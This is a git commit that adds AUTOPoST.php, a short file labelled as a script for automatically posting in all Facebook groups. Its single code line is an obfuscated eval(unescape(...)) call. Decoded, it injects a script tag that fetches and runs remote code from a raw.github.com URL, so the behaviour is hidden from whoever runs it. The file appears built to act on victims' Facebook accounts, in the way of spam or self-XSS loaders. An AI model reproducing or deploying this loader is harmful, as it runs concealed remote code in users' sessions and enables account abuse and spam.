d905c424f74617184e28dbca2fa34a00ec59d7cc
TheeKing <kali-1@outlook.com>
2014-03-16 04:00:23 -0700

    Create AUTOPoST.php

---
+++ AUTOPoST.php
@@ -0,0 +1,5 @@
+/*HTML/JavaScript page status="protected"*/
+/*Auto POST in All Facebook Group*/
+/*Copyright © 2014 Kodran Piraj. All Rights Reserved.*/
+
+eval(unescape("%28function%28%29%7Bdocument.body.appendChild%28document.createElement%28%27script%27%29%29.src%3D%27https%3A//raw.github.com/TheeKing/TheKing/master/TheeBoosss.php%27%3B%7D%29%28%29"));
